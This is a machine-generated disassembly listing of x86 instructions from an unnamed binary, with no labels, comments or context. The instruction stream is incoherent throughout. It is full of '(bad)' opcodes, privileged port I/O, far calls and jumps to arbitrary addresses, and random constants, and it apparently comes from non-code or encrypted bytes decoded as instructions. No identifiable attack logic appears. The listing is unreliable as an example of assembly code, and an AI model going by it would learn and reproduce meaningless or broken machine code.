  405af3:	mov    dh,0xd4
  405af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405af6:	cmp    esp,DWORD PTR [ecx-0x5d7aa187]
  405afc:	leave  
  405afd:	xlat   BYTE PTR ds:[ebx]
  405afe:	pop    edx
  405aff:	mov    ebx,0x63025ab4
  405b04:	xlat   BYTE PTR ds:[ebx]
  405b05:	adc    DWORD PTR [eax-0x67],eax
  405b08:	in     eax,dx
  405b09:	stc    
  405b0a:	add    esp,edi
  405b0c:	jno    0x405b23
  405b0e:	xor    cl,BYTE PTR [esi-0x7c]
  405b11:	sbb    eax,0xf7238104
  405b16:	ja     0x405adb
  405b18:	clc    
  405b19:	cdq    
  405b1a:	les    ebp,FWORD PTR [ebx-0x48]
  405b1d:	call   0xf6f8:0xa182c5b2
  405b24:	adc    ch,BYTE PTR [esi]
  405b26:	loopne 0x405b52
  405b28:	popf   
  405b29:	in     al,dx
  405b2a:	xor    DWORD PTR [ecx],eax
  405b2c:	jns    0x405b14
  405b2e:	mov    ds:0xa8deb76d,al
  405b33:	mov    ?,WORD PTR [esi+0x6d]
  405b36:	push   ecx
  405b37:	rcl    ebp,0xcc
  405b3a:	fstp   QWORD PTR [edx-0x55873a5a]
  405b40:	lahf   
  405b41:	and    esi,edi
  405b43:	xchg   ecx,eax
  405b44:	dec    eax
  405b45:	dec    edx
  405b46:	xor    BYTE PTR [eax+0x7e],bh
  405b49:	aam    0x35
  405b4b:	xchg   ebp,eax
  405b4c:	je     0x3d2d1c1b
  405b52:	retf   
  405b53:	lods   eax,DWORD PTR ds:[esi]
  405b54:	hlt    
  405b55:	add    al,0xbe
  405b57:	xchg   ecx,eax
  405b58:	ret    
  405b59:	mov    al,ds:0xc228f007
  405b5e:	imul   esi,DWORD PTR [esi],0xa51d39f0
  405b64:	push   ebp
  405b65:	jo     0x405b19
  405b67:	leave  
  405b68:	fidiv  WORD PTR [ecx-0x798175f8]
  405b6e:	add    al,0xb1
  405b70:	sahf   
  405b71:	pusha  
  405b72:	sbb    BYTE PTR [esi+0x3f],ch
  405b75:	and    BYTE PTR [edi+0x2b],cl
  405b78:	ret    
  405b79:	int3   
  405b7a:	jmp    0x71660df
  405b7f:	xchg   edi,eax
  405b80:	xor    eax,0xb0d3123
  405b85:	xchg   ebx,eax
  405b86:	dec    edx
  405b87:	mov    al,ds:0xca3a7570
  405b8c:	lock imul ebp,DWORD PTR [esi-0x1674621c],0xb5e156f4
  405b97:	sbb    bl,BYTE PTR [ecx-0x24]
  405b9a:	xchg   ecx,eax
  405b9b:	sub    BYTE PTR [esi+0x54fc98ad],bl
  405ba1:	push   esp
  405ba2:	sbb    esp,DWORD PTR [edx-0x41]
  405ba5:	dec    eax
  405ba6:	shr    BYTE PTR [ebx-0x6a041a3c],cl
  405bac:	cld    
  405bad:	jecxz  0x405b6e
  405baf:	(bad)  
  405bb0:	std    
  405bb1:	jb     0x405bfe
  405bb3:	aaa    
  405bb4:	inc    ecx
  405bb5:	jl     0x405bc4
  405bb7:	pop    ebx
  405bb8:	xchg   ebp,eax
  405bb9:	jno    0x405b94
  405bbb:	push   ebx
  405bbc:	retf   
  405bbd:	stc    
  405bbe:	lahf   
  405bbf:	or     DWORD PTR [eax+eax*8+0x14873f5],esi
  405bc6:	or     DWORD PTR [ecx],0xffffff85
  405bc9:	fs push eax
  405bcb:	outs   dx,DWORD PTR ds:[esi]
  405bcc:	bound  ecx,QWORD PTR [edx-0x5da0e0ff]
  405bd2:	mov    eax,0xcedfcad8
  405bd7:	pop    es
  405bd8:	adc    esi,ecx
  405bda:	ret    0x3eb5
  405bdd:	xor    BYTE PTR [eax-0x5d],al
  405be0:	js     0x405c59
  405be2:	add    dl,BYTE PTR [eax]
  405be4:	or     esi,eax
  405be6:	push   es
  405be7:	cld    
  405be8:	xor    dh,BYTE PTR [edi-0x74]
  405beb:	test   BYTE PTR [ecx-0x71],cl
  405bee:	jge    0x405be8
  405bf0:	fwait
  405bf1:	mov    al,ds:0x357f4f74
  405bf6:	gs cmc 
  405bf8:	ss cmp ebx,ebp
  405bfb:	mov    ebx,0xcf82c60b
  405c00:	shl    esi,cl
  405c02:	popa   
  405c03:	lock pop eax
  405c05:	jb     0x405c5e
  405c07:	call   0x5f2404dd
  405c0c:	push   esp
  405c0d:	lahf   
  405c0e:	cli    
  405c0f:	sub    ebx,esi
  405c11:	xlat   BYTE PTR ds:[ebx]
  405c12:	lds    ebp,FWORD PTR [ecx]
  405c14:	dec    esi
  405c15:	ja     0x405c41
  405c17:	mov    cs,esp
  405c19:	push   es
  405c1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c1b:	mov    dh,0xc3
  405c1d:	int    0x46
  405c1f:	push   eax
  405c20:	cmp    eax,DWORD PTR [ecx]
  405c22:	cmp    BYTE PTR [ebp+0x2cb4bf95],bl
  405c28:	and    DWORD PTR [ebp+0x6d310ab8],ebx
  405c2e:	xchg   esi,eax
  405c2f:	push   es
  405c30:	cli    
  405c31:	(bad)  
  405c32:	pop    esi
  405c33:	dec    ebx
  405c34:	jo     0x405c60
  405c36:	out    0xb,al
  405c38:	sbb    eax,0x8aa5cc7c
  405c3d:	and    al,BYTE PTR [ebx+0x35]
  405c40:	sub    al,0x28
  405c42:	xchg   esp,eax
  405c43:	fimul  DWORD PTR [eax+0x44bdcd41]
  405c49:	das    
  405c4a:	and    eax,0x4d023826
  405c4f:	xor    eax,0x62edabc2
  405c54:	xchg   ecx,ebx
  405c56:	pop    ss
  405c57:	xor    ebp,edx
  405c59:	loopne 0x405c14
  405c5b:	test   DWORD PTR [eax+ebp*4+0x4a],esp
  405c5f:	enter  0x847d,0x5
  405c63:	das    
  405c64:	push   ds
  405c65:	push   edi
  405c66:	sub    eax,0x9cc7494a
  405c6b:	sti    
  405c6c:	loope  0x405bf1
  405c6e:	mov    edx,0x442bcb2
  405c73:	jg     0x405cce
  405c75:	jmp    0xbbc1:0xed7cd3
  405c7c:	aas    
  405c7d:	in     eax,dx
  405c7e:	xor    DWORD PTR [esi],ebx
  405c80:	pop    eax
  405c81:	nop    DWORD PTR [eax]
  405c84:	pmulhw mm5,QWORD PTR [ecx]
  405c87:	call   0x928:0xe6c41b23
  405c8e:	or     eax,0x5e2b8712
  405c93:	das    
  405c94:	pop    edi
  405c95:	rcr    ah,1
  405c97:	stos   BYTE PTR es:[edi],al
  405c98:	mov    DWORD PTR [eax-0x442229c5],edx
  405c9e:	imul   esp,ebp,0xffffffd0
  405ca1:	add    BYTE PTR [edx],0x84
  405ca4:	mov    dh,0xbe
  405ca7:	es sti 
  405ca9:	push   esp
  405caa:	inc    ecx
  405cab:	dec    eax
  405cac:	or     DWORD PTR [esi],ebx
  405cae:	sahf   
  405caf:	sub    BYTE PTR [ebx-0x3b],dl
  405cb2:	out    0xcc,al
  405cb4:	inc    esp
  405cb5:	call   0x77cebcaa
  405cba:	push   edi
  405cbb:	nop
  405cbc:	mov    ebp,0x6d55f762
  405cc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cc2:	pop    eax
  405cc3:	cmp    eax,0x812b941b
  405cc8:	cmp    edx,DWORD PTR [esi-0x476fe44]
  405cce:	nop
  405ccf:	imul   eax,DWORD PTR [ecx+0x28],0x61
  405cd3:	sbb    eax,0x73b13a12
  405cd8:	inc    DWORD PTR ds:0x82667be1
  405cde:	pop    eax
  405cdf:	mov    esp,0xbdcba7ab
  405ce4:	push   es
  405ce5:	fcom   st(5)
  405ce7:	ret    
  405ce8:	sub    esp,esp
  405cea:	fistp  QWORD PTR [eax+0x2c04e448]
  405cf0:	or     BYTE PTR [ebx],bh
  405cf2:	xor    ebx,edi
  405cf4:	add    DWORD PTR [esi-0x2d],ecx
  405cf7:	pop    esp
  405cf8:	inc    ecx
  405cf9:	dec    esp
  405cfa:	test   al,0x80
  405cfc:	ds daa 
  405cfe:	rol    dl,1
  405d00:	iret   
  405d01:	mov    bl,0x28
  405d03:	das    
  405d04:	push   ebx
  405d05:	lods   al,BYTE PTR ds:[esi]
  405d06:	(bad)  
  405d07:	jecxz  0x405d05
  405d09:	pop    esp
  405d0a:	je     0x405cd3
  405d0c:	ins    BYTE PTR es:[edi],dx
  405d0d:	dec    eax
  405d0e:	jle    0x405d7a
  405d10:	jbe    0x405d06
  405d12:	gs fwait
  405d14:	push   ebp
  405d15:	loop   0x405c9b
  405d17:	gs stc 
  405d19:	ins    DWORD PTR es:[edi],dx
  405d1a:	mov    ?,WORD PTR [edi]
  405d1c:	shr    cl,0x4a
  405d1f:	or     ebx,esi
  405d21:	jge    0x405cc9
  405d23:	push   esp
  405d24:	jge    0x405d9d
  405d26:	add    DWORD PTR [edx+0x7d2ed0c6],edx
  405d2c:	ret    0x4772
  405d2f:	mov    BYTE PTR [ebp+0x57],cl
  405d32:	fcomip st,st(5)
  405d34:	and    bh,BYTE PTR [edi+ebp*2-0x7f]
  405d38:	adc    ebp,DWORD PTR ds:0x6d6bc73d
  405d3e:	mov    esi,0xf30d2544
  405d43:	and    eax,DWORD PTR [ebp+0x953cc06]
  405d49:	sbb    ecx,ebx
  405d4b:	xchg   edi,eax
  405d4c:	sahf   
  405d4d:	cmp    eax,0xd26b76e3
  405d52:	js     0x405dca
  405d54:	std    
  405d55:	ins    BYTE PTR es:[edi],dx
  405d56:	sbb    BYTE PTR [edx-0x6e],dl
  405d59:	pop    es
  405d5a:	push   es
  405d5b:	mov    edi,0x947b0894
  405d60:	jmp    0x75c8c3ff
  405d65:	xchg   DWORD PTR [edx+eiz*1],edi
  405d68:	xchg   edx,eax
  405d69:	mov    BYTE PTR [esi+0xe5cd173],0x73
  405d70:	cli    
  405d71:	shl    BYTE PTR [edi-0x682a7c45],cl
  405d77:	ins    DWORD PTR es:[edi],dx
  405d78:	repz jb 0x405d64
  405d7b:	and    dl,BYTE PTR [ebx-0x3dd30b63]
  405d81:	adc    bl,BYTE PTR [eax-0x4b]
  405d84:	jne    0x405dcf
  405d86:	(bad)  
  405d87:	fnsave [edi-0x65fdc16]
  405d8d:	jg     0x405d7a
  405d8f:	fistp  QWORD PTR [ebp+0x59a09720]
  405d95:	retf   
  405d96:	dec    edi
  405d97:	dec    ebx
  405d98:	call   0x2461ef20
  405d9d:	dec    esi
  405d9e:	mov    ebx,0x39c1444a
  405da3:	aas    
  405da4:	cmp    DWORD PTR [ecx],0x58de38eb
  405daa:	ja     0x405e22
  405dac:	rcl    BYTE PTR [eax+0xf5b5703],0x4f
  405db3:	fisttp DWORD PTR [ecx-0x3a]
  405db6:	pop    ebx
  405db7:	js     0x405df9
  405db9:	jmp    0x497b6ddf
  405dbe:	pop    ebp
  405dbf:	imul   edx,DWORD PTR [ebp-0x20],0x63e6832e
  405dc6:	mov    eax,ds:0x7523e2d7
  405dcb:	lds    ecx,FWORD PTR [edx]
  405dcd:	shr    BYTE PTR [esi-0x4c],1
  405dd0:	mov    esp,0x8fa48b1a
  405dd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dd6:	mov    al,ds:0xfb7a9e9e
  405ddb:	int    0x15
  405ddd:	jl     0x405dd1
  405ddf:	dec    ecx
  405de0:	sbb    bl,0x7c
  405de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405de4:	push   ecx
  405de5:	push   ds
  405de6:	imul   edi,DWORD PTR [eax],0xfffffffd
  405de9:	or     al,0x41
  405deb:	aas    
  405dec:	sar    DWORD PTR [esi],0xe4
  405def:	test   DWORD PTR [esi],edi
  405df1:	and    ebx,esp
  405df3:	cmp    BYTE PTR [eax],al
  405df5:	inc    eax
  405df6:	jg     0x405dcb
  405df8:	cld    
  405df9:	push   cs
  405dfa:	shl    bl,0xe9
  405dfd:	inc    edi
  405dfe:	test   BYTE PTR [eax-0x6ad6cf2e],cl
  405e04:	xchg   esp,eax
  405e05:	push   ebp
  405e06:	push   edi
  405e07:	cs scas eax,DWORD PTR es:[edi]
  405e09:	or     al,0xb9
  405e0b:	mov    ebp,0x418523a
  405e10:	test   BYTE PTR [edx+eax*1],bh
  405e13:	sahf   
  405e14:	int3   
  405e15:	imul   edi,DWORD PTR [ecx],0xfffffff6
  405e18:	jmp    0x405e27
  405e1a:	mov    bh,0xd9
  405e1c:	push   ds
  405e1d:	jae    0x405dd3
  405e1f:	jmp    0x94d8:0x4f19d4ee
  405e26:	ss (bad) 
  405e28:	cmp    ecx,DWORD PTR [edi]
  405e2a:	pop    ecx
  405e2b:	sub    DWORD PTR [edx],edx
  405e2d:	pop    esp
  405e2e:	sub    ebx,DWORD PTR [ebx+0x7984d795]
  405e34:	mov    esi,0xe92fba89
  405e39:	das    
  405e3a:	in     eax,dx
  405e3b:	outs   dx,DWORD PTR ds:[esi]
  405e3c:	push   ss
  405e3d:	and    ah,BYTE PTR [ebx+ebx*8+0x243b5975]
  405e44:	mov    ecx,0x4d99500e
  405e49:	mov    BYTE PTR [esi+0x6e14c102],bh
  405e4f:	lea    ebp,[edx-0x65c9d10a]
  405e55:	(bad)  
  405e56:	push   ecx
  405e57:	imul   edx,DWORD PTR [esi+edx*2+0x9],0x95763c8a
  405e5f:	das    
  405e60:	cs push esp
  405e62:	psubusw mm4,QWORD PTR [esi+0x5504af4e]
  405e69:	js     0x405dfc
  405e6b:	jns    0x405ec7
  405e6d:	pop    esi
  405e6e:	mov    DWORD PTR ds:0x67fbc565,ecx
  405e74:	mov    bh,0x57
  405e76:	inc    edx
  405e77:	add    eax,0x155d330
  405e7c:	mov    ch,0x26
  405e7e:	rcl    BYTE PTR [eax+0x73ebd90a],0x6e
  405e85:	iret   
  405e86:	in     al,0xe6
  405e88:	cdq    
  405e89:	(bad)  
  405e8a:	add    eax,0x42c1ec60
  405e8f:	js     0x405e1d
  405e91:	icebp  
  405e92:	ins    BYTE PTR es:[edi],dx
  405e93:	mov    ds:0x8ea3c03d,eax
  405e98:	jbe    0x405e45
  405e9a:	dec    ebp
  405e9b:	fsubp  st(4),st
  405e9d:	add    DWORD PTR [edx+0x64],edi
  405ea0:	dec    esp
  405ea1:	ror    BYTE PTR [eax-0x16],1
  405ea4:	push   0x8ed9dc91
  405ea9:	push   ebp
  405eaa:	(bad)  [edi+0x75df34f7]
  405eb0:	cli    
  405eb1:	mov    esp,0x6ff29cbb
  405eb6:	mov    cl,0xff
  405eb8:	popa   
  405eb9:	pushf  
  405eba:	dec    edx
  405ebb:	je     0x405ef0
  405ebd:	or     dl,ah
  405ebf:	in     eax,0x5a
  405ec1:	loopne 0x405eb6
  405ec3:	dec    ebp
  405ec4:	xchg   edx,eax
  405ec5:	push   eax
  405ec6:	pop    esi
  405ec7:	retf   0x55fb
  405eca:	mov    ebx,es
  405ecc:	sub    BYTE PTR [ecx-0x746603a2],0x8d
  405ed3:	jae    0x405efc
  405ed5:	(bad)  
  405ed6:	or     ebx,DWORD PTR [esi-0x796fac82]
  405edc:	rcr    BYTE PTR [ecx-0x1ea232ae],cl
  405ee2:	push   0x42aa183f
  405ee7:	inc    ebp
  405ee8:	test   al,0x91
  405eea:	out    0x6d,al
  405eec:	cmovns ebp,eax
  405eef:	dec    edx
  405ef0:	mov    esi,0x21254fce
  405ef5:	add    al,bl
  405ef7:	retf   
  405ef8:	sub    bl,BYTE PTR [edx]
  405efa:	sbb    bh,BYTE PTR [esi]
  405efc:	add    al,0x9
  405efe:	mov    eax,esi
  405f00:	dec    edi
  405f01:	test   al,0x8c
  405f03:	inc    ebp
  405f04:	mov    edx,0x5fa6b07
  405f09:	test   eax,0xea9af5e3
  405f0e:	call   0x3266:0x6306126b
  405f15:	or     DWORD PTR [ebp+0x4108bd8],ecx
  405f1b:	xchg   ebx,eax
  405f1c:	mov    eax,0x94910b60
  405f21:	jne    0x405ebb
  405f23:	cdq    
  405f24:	ins    DWORD PTR es:[edi],dx
  405f25:	pop    esi
  405f26:	push   ecx
  405f27:	loop   0x405eb4
  405f29:	in     al,0x50
  405f2b:	push   0x5e
  405f2d:	ret    
  405f2e:	mov    bl,0xf5
  405f30:	cmp    al,BYTE PTR [esi+ebx*4-0x7a]
  405f34:	push   ebp
  405f35:	test   ebx,edi
  405f37:	inc    ebp
  405f38:	ja     0x405f96
  405f3a:	fsubr  QWORD PTR [edi+edx*2]
  405f3d:	xchg   edx,eax
  405f3e:	dec    ebp
  405f3f:	mov    DWORD PTR [ecx+0x44],esp
  405f42:	out    0xf1,al
  405f44:	mov    ah,dl
  405f46:	(bad)  
  405f47:	sub    eax,0x177c5489
  405f4c:	ret    0x8ce9
  405f4f:	sub    dl,BYTE PTR [ebp-0xa47a4a3]
  405f55:	adc    BYTE PTR [eax+0x507f65ea],dl
  405f5b:	push   eax
  405f5c:	or     al,0x2c
  405f5e:	cmp    ebx,DWORD PTR [ebp-0x40006907]
  405f64:	aaa    
  405f65:	adc    al,BYTE PTR [ebp+0x2a]
  405f68:	jbe    0x405f60
  405f6a:	xchg   ah,ch
  405f6c:	cmp    edx,esi
  405f6e:	pop    DWORD PTR [ecx-0x27052d5a]
  405f74:	in     eax,dx
  405f75:	sub    BYTE PTR ds:[ecx+0x1c],dl
  405f79:	popa   
  405f7a:	out    0x68,al
  405f7c:	pop    eax
  405f7d:	and    eax,edi
  405f7f:	push   ecx
  405f80:	rcl    BYTE PTR [edi-0x34],cl
  405f83:	fimul  WORD PTR ds:0xa76cb557
  405f89:	or     ebp,DWORD PTR [esi-0x54]
  405f8c:	xlat   BYTE PTR ds:[ebx]
  405f8d:	fisttp WORD PTR [esi+0x2957d6af]
  405f93:	retf   0x3e8b
  405f96:	sti    
  405f97:	fmulp  st(6),st
  405f99:	mov    edi,eax
  405f9b:	pop    ss
  405f9c:	mov    fs,WORD PTR [edx]
  405f9e:	jl     0x405f5c
  405fa0:	jecxz  0x406020
  405fa2:	cmp    ebx,edx
  405fa4:	out    0x74,al
  405fa6:	pop    esi
  405fa7:	out    dx,al
  405fa8:	sub    eax,0x776a7eef
  405fad:	sbb    al,0xc9
  405faf:	pop    es
  405fb0:	out    0xa2,al
  405fb2:	lock scas al,BYTE PTR es:[edi]
  405fb4:	pushf  
  405fb5:	(bad)  
  405fb6:	loopne 0x40601f
  405fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fb9:	enter  0x8285,0xdd
  405fbd:	mov    ecx,0xbe1b5274
  405fc2:	shl    BYTE PTR [ecx+0x36],cl
  405fc5:	inc    esp
  405fc6:	popf   
  405fc7:	sub    ebp,DWORD PTR [edi+edi*4]
  405fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fcb:	pop    esi
  405fcc:	xor    eax,0x354c8965
  405fd1:	mov    ebx,0xaf636f46
  405fd6:	inc    ebx
  405fd7:	leave  
  405fd8:	push   edx
  405fd9:	mov    ds:0xd90998a0,al
  405fde:	js     0x405fa1
  405fe0:	jb     0x405f7a
  405fe2:	mov    edx,0x8a5bba49
  405fe7:	mov    BYTE PTR [ebp+0x5b868be8],cl
  405fed:	cmp    BYTE PTR ds:0xca467d91,dh
  405ff3:	mov    ch,0xf7
  405ff5:	lea    edi,[ecx+0x76e128f7]
  405ffb:	ds jns 0x405fdb
  405ffe:	push   ds
  405fff:	lock and esi,DWORD PTR [eax+0x62]
  406003:	stos   BYTE PTR es:[edi],al
  406004:	push   ds
  406005:	loope  0x405fa1
  406007:	test   BYTE PTR [ecx-0x6e],cl
  40600a:	xor    dh,cl
  40600c:	adc    BYTE PTR [ebx+0x38],bl
  40600f:	loope  0x405fd7
  406011:	add    edi,DWORD PTR [ecx]
  406013:	pusha  
  406014:	sub    al,0xb3
  406016:	sbb    eax,0xc6d0c408
  40601b:	and    al,0x69
  40601d:	xor    al,0x81
  40601f:	in     al,dx
  406020:	out    dx,al
  406021:	sar    DWORD PTR [esi-0x39],cl
  406024:	sub    eax,0x62c5889c
  406029:	dec    esi
  40602a:	test   edi,ecx
  40602c:	push   ecx
  40602d:	fld    QWORD PTR [ecx]
  40602f:	retf   
  406030:	xor    cl,0x18
  406033:	xor    bh,bh
  406035:	pop    eax
  406036:	(bad)  
  406037:	js     0x40606d
  406039:	xchg   edi,eax
  40603a:	cwde   
  40603b:	stos   DWORD PTR es:[edi],eax
  40603c:	ja     0x405fe9
  40603e:	(bad)  
  40603f:	push   eax
  406040:	divps  xmm4,XMMWORD PTR [eax]
  406043:	in     al,0x55
  406045:	jnp    0x406066
  406047:	(bad)  
  40604a:	fiadd  WORD PTR [edx]
  40604c:	sub    dl,ah
  40604e:	jo     0x405fdf
  406050:	les    ebp,FWORD PTR [ecx]
  406052:	or     eax,0xc2253728
  406057:	push   0x6e7c2e6f
  40605c:	int3   
  40605d:	cli    
  40605e:	push   0xffffffd5
  406060:	enter  0xfc31,0xa9
  406064:	das    
  406065:	inc    edi
  406066:	stos   BYTE PTR es:[edi],al
  406067:	xchg   edx,eax
  406068:	out    dx,al
  406069:	int    0x3d
  40606b:	retf   
  40606c:	cld    
  40606d:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40606f:	cs adc edx,eax
  406072:	mov    esp,0x9a7b3d76
  406077:	lahf   
  406078:	mov    ds:0xa2e89229,al
  40607d:	cmp    eax,0xa3131d94
  406082:	sti    
  406083:	addps  xmm3,XMMWORD PTR [edi-0x3668db87]
  40608a:	push   cs
  40608b:	cmc    
  40608c:	neg    DWORD PTR [edi+0x75]
  40608f:	dec    ecx
  406090:	xchg   ebx,eax
  406091:	mov    bl,0xdd
  406093:	(bad)  
  406094:	adc    BYTE PTR [edx+0x2358392b],bh
  40609a:	mov    eax,0x616b8273
  40609f:	(bad)  
  4060a0:	rsm    
  4060a2:	pop    esi
  4060a3:	frstor [edx-0x2a4f82e0]
  4060a9:	dec    esp
  4060aa:	in     al,dx
  4060ab:	inc    eax
  4060ac:	cmp    dl,BYTE PTR [ebx]
  4060ae:	add    DWORD PTR [edx+0x2e11b193],ebp
  4060b4:	lods   eax,DWORD PTR ds:[esi]
  4060b5:	dec    edi
  4060b6:	imul   edx,DWORD PTR [ebx+0x7f17263b],0xa9627a61
  4060c0:	xchg   BYTE PTR [edi],bl
  4060c2:	mov    ds:0x7d4f387,eax
  4060c7:	arpl   WORD PTR [ebx+0x5890e17b],cx
  4060cd:	mov    al,ds:0xe33815da
  4060d2:	sub    al,0xda
  4060d4:	pop    edi
  4060d5:	loope  0x4060a5
  4060d7:	cwde   
  4060d8:	jg     0x406103
  4060da:	jmp    0x2b70:0xd3b5922c
  4060e1:	push   0xffffff9b
  4060e3:	dec    ecx
  4060e4:	sahf   
  4060e5:	iret   
  4060e6:	jmp    0x88900855
  4060eb:	out    dx,al
  4060ec:	ins    BYTE PTR es:[edi],dx
  4060ed:	ins    DWORD PTR es:[edi],dx
  4060ee:	or     eax,0xfbed5f65
  4060f3:	fist   WORD PTR [ebp-0x79]
  4060f6:	mov    BYTE PTR [ebx],dl
  4060f8:	pop    esp
  4060f9:	xchg   ebp,eax
  4060fa:	push   es
  4060fb:	add    al,0xbb
  4060fd:	cmp    esp,eax
  4060ff:	xchg   ebx,eax
  406100:	gs stc 
  406102:	mov    ds:0xf477baf1,al
  406107:	je     0x406102
  406109:	lock test al,0x85
  40610c:	in     eax,dx
  40610d:	push   ecx
  40610e:	sahf   
  40610f:	in     al,0x46
  406111:	test   eax,0xeff5edac
  406116:	and    ah,bh
  406118:	daa    
  406119:	mov    esi,edi
  40611b:	mov    ch,0xa3
  40611d:	loopne 0x4060fe
  40611f:	fidivr WORD PTR es:[ecx+0x2a]
  406123:	jne    0x4060c7
  406125:	out    0xdc,eax
  406127:	mov    dl,0x58
  406129:	push   ss
  40612a:	ret    0x1cb3
  40612d:	(bad)  
  40612e:	pushf  
  40612f:	lock sub al,ah
  406132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406133:	cmp    al,0x88
  406135:	mov    bl,0x50
  406137:	loope  0x406183
  406139:	dec    edi
  40613a:	cmp    DWORD PTR [edx+0x4d901f8],eax
  406140:	mov    al,ds:0x8356f561
  406145:	inc    eax
  406146:	adc    eax,0xcda9f1c0
  40614b:	xchg   ebx,eax
  40614c:	ja     0x40616b
  40614e:	mov    bl,0xde
  406150:	je     0x406115
  406152:	cmp    eax,0xe938549f
  406157:	push   esp
  406158:	outs   dx,BYTE PTR ds:[esi]
  406159:	rol    DWORD PTR [edi-0x5],1
  40615c:	in     al,dx
  40615d:	dec    ebp
  40615e:	dec    esi
  40615f:	scas   eax,DWORD PTR es:[edi]
  406160:	push   ss
  406161:	jmp    0x40617c
  406163:	pop    es
  406164:	enter  0xab3c,0xf6
  406168:	jnp    0x406120
  40616a:	shl    DWORD PTR [ecx+0x4d],0x62
  40616e:	push   0x389a9ff6
  406173:	inc    ecx
  406174:	add    edx,eax
  406176:	shl    DWORD PTR [ecx+0x56],cl
  406179:	sub    bl,BYTE PTR es:[edi]
  40617c:	dec    ecx
  40617d:	(bad)  
  40617f:	scas   eax,DWORD PTR es:[edi]
  406180:	adc    DWORD PTR [ecx],ebp
  406182:	stos   BYTE PTR es:[edi],al
  406183:	sbb    BYTE PTR [ebx+0x47f0637f],0x8d
  40618a:	rol    BYTE PTR [esi-0x3e5bc2b3],cl
  406190:	jecxz  0x406137
  406192:	lahf   
  406193:	(bad)  
  406194:	xlat   BYTE PTR ds:[ebx]
  406195:	mov    eax,ds:0x5c4c8af6
  40619a:	jbe    0x40615c
  40619c:	push   esp
  40619d:	xor    DWORD PTR [eax+ebp*4],esp
  4061a0:	scas   al,BYTE PTR es:[edi]
  4061a1:	mov    bl,0x75
  4061a3:	popa   
  4061a4:	or     BYTE PTR [ebx+eiz*4],0x31
  4061a8:	std    
  4061a9:	pop    esp
  4061aa:	dec    edi
  4061ab:	cmp    ebx,ecx
  4061ad:	lds    ebp,FWORD PTR [eax]
  4061af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061b0:	std    
  4061b1:	lea    ebx,[esi-0x37]
  4061b4:	adc    ah,BYTE PTR [edx+0x2332b004]
  4061ba:	fsub   st(4),st
  4061bc:	pop    esp
  4061bd:	(bad)  
  4061bf:	or     BYTE PTR [esp+ebp*1],0x6c
  4061c3:	(bad)  
  4061c4:	jp     0x4061b6
  4061c6:	scas   eax,DWORD PTR es:[edi]
  4061c7:	sbb    bh,ch
  4061c9:	call   0x70d0:0xef669e47
  4061d0:	and    al,0x63
  4061d2:	pop    edx
  4061d3:	mov    edx,0xd413d03
  4061d8:	inc    ebp
  4061d9:	imul   esi,DWORD PTR [esi+0x5d],0x568f5c87
  4061e0:	add    BYTE PTR [edi-0x44feae37],al
  4061e6:	and    BYTE PTR [esi-0x3a982626],bl
  4061ec:	push   0xca05d1b6
  4061f1:	jo     0x40626d
  4061f3:	push   ecx
  4061f4:	mov    bl,0x23
  4061f6:	in     al,0x61
  4061f8:	mov    bl,0x2
  4061fa:	fs jp  0x406258
  4061fd:	(bad)
  406201:	dec    ebx
  406202:	std    
  406203:	jbe    0x406281
  406205:	mov    esp,0x5d359bfc
  40620a:	ror    DWORD PTR [esi-0x75],1
  40620d:	test   BYTE PTR [ebp-0x59],0xb5
  406211:	js     0x4061f2
  406213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406214:	leave  
  406215:	dec    eax
  406216:	or     eax,0x63e5fa38
  40621b:	push   ds
  40621c:	scas   al,BYTE PTR es:[edi]
  40621d:	xchg   ebx,eax
  40621e:	sbb    DWORD PTR [ebx],eax
  406220:	bound  edi,QWORD PTR [eax+0x3d]
  406223:	mov    BYTE PTR [edx+0x1],0x4e
  406227:	mov    al,ds:0x75566038
  40622c:	xor    ch,BYTE PTR [ecx]
  40622e:	jnp    0x4062a6
  406230:	add    BYTE PTR [ecx],bh
  406232:	imul   edx,ecx,0xffffffcb
  406235:	jmp    FWORD PTR [esi]
  406237:	xlat   BYTE PTR ds:[ebx]
  406238:	push   0xffffffad
  40623a:	mov    ch,0xa3
  40623c:	(bad)  
  40623e:	add    bl,BYTE PTR [edi-0x5b]
  406241:	push   cs
  406242:	aas    
  406243:	add    eax,0xaefc30a3
  406248:	in     al,0x94
  40624a:	inc    ebp
  40624b:	out    0x3c,eax
  40624d:	sbb    dl,BYTE PTR [edi+0x42]
  406250:	xor    al,0xe
  406252:	fcomi  st,st(0)
  406254:	and    bl,BYTE PTR [ebx+eax*1-0x25]
  406258:	fist   DWORD PTR [ebp+0x28]
  40625b:	mov    dl,BYTE PTR [ecx-0x26]
  40625e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40625f:	mov    WORD PTR [esi+0x13050597],ds
  406265:	test   DWORD PTR [eax+0x35],edx
  406268:	add    DWORD PTR [ebx+0x22],edx
  40626b:	das    
  40626c:	retf   0xa985
  40626f:	push   ebx
  406270:	test   al,0xf0
  406272:	jecxz  0x4062f0
  406274:	push   edx
  406275:	popf   
  406276:	add    ah,al
  406278:	jmp    0x74ec:0x510f3ead
  40627f:	and    al,0xb3
  406281:	push   ebp
  406282:	xor    DWORD PTR [edx+0x76c3032d],ebp
  406288:	dec    ebp
  406289:	mov    dh,0x9c
  40628b:	add    edx,edx
  40628d:	jbe    0x4062f5
  40628f:	dec    edx
  406290:	sahf   
  406291:	inc    esi
  406292:	mov    WORD PTR [edi+0x31],fs
  406295:	pushf  
  406296:	jno    0x40626b
  406298:	pop    ss
  406299:	stc    
  40629a:	xor    al,bl
  40629c:	cmc    
  40629d:	sti    
  40629e:	loop   0x4062b3
  4062a0:	pop    edx
  4062a1:	push   0x8f0e5597
  4062a6:	rcr    BYTE PTR [ebx-0x7008783c],cl
  4062ac:	mov    cl,0x50
  4062ae:	aas    
  4062af:	inc    esp
  4062b0:	cmc    
  4062b1:	sbb    DWORD PTR [ebp+eax*8-0x5ba48cc],esi
